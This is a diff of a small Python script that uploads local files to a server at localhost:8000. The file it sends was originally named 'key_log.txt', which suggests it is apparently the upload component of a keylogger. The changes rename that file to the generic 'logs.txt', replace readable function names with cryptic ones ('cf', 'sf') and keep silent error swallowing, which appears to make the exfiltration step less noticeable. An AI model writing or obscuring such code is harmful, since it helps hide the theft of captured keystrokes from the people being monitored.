@@ -1,26 +1,26 @@
 import requests
 import os
-import time
+import mimetypes
+
 
 SERVER_URL = "http://localhost:8000"
 
-files_to_send = ['./key_log.txt']
+files_to_send = ['./logs.txt']
 
-def create_dummy_log_files():
+def cf():
     for filename in files_to_send:
         if not os.path.exists(filename):
-            with open(filename, "w") as f:
-                f.write(f"This is dummy content for {os.path.basename(filename)}.\n")
-                f.write(f"Log entry generated at: {time.ctime()}\n")
-            print(f"Created dummy file: {filename}")
+            open(filename, "w")
 
-def sendFile():
-    create_dummy_log_files()
+def sf():
+    cf()
 
     for filepath in files_to_send:
         if not os.path.exists(filepath):continue
         try:
             with open(filepath, 'rb') as f:
-                files = {'upload_file': (os.path.basename(filepath), f, 'text/plain')}
+                mimetype, _ = mimetypes.guess_type(filepath)
+                mimetype = mimetype or 'application/octet-stream'
+                files = {'file': (os.path.basename(filepath), f, mimetype)}
                 requests.post(SERVER_URL, files=files)
         except:pass
